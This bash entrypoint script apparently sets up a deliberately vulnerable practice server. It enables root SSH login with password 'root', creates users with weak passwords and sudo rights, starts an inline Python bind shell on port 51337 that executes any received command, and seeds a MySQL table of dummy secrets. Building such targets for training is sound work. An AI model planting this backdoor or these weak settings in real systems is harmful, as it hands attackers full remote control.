#!/bin/bash

echo "root:root" | chpasswd
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config

sudo useradd -m nate
sudo useradd -m justin
sudo useradd -m adil

echo "nate:password" | chpasswd
echo "justin:123456" | chpasswd
echo "adil:b892gb93yg2gb42gb942g7927wbr9fgur9735fb97g9b27unguessable" | chpasswd

sudo usermod -aG sudo nate
echo "justin ALL=(ALL:ALL) ALL" | sudo tee -a /etc/sudoers
sudo -u adil python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",51337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")' &

echo "here"

service mysql start
service php7.2-fpm start
service nginx start
service ssh start

mysql -uroot -e 'CREATE DATABASE user_data; USE user_data; CREATE TABLE secret_user_data(uid int NOT NULL AUTO_INCREMENT, message varchar(100) NOT NULL, PRIMARY KEY (uid));'
mysql -uroot -e "USE user_data; INSERT INTO secret_user_data (message) VALUES('super secret data');"
mysql -uroot -e "USE user_data; INSERT INTO secret_user_data (message) VALUES('scottys first name is');"
mysql -uroot -e "USE user_data; INSERT INTO secret_user_data (message) VALUES('roses are red violets are blue i cannot think of anythin');"
mysql -uroot -e "USE user_data; INSERT INTO secret_user_data (message) VALUES('meow');"

for (( ; ; ))
do
   sleep 1
done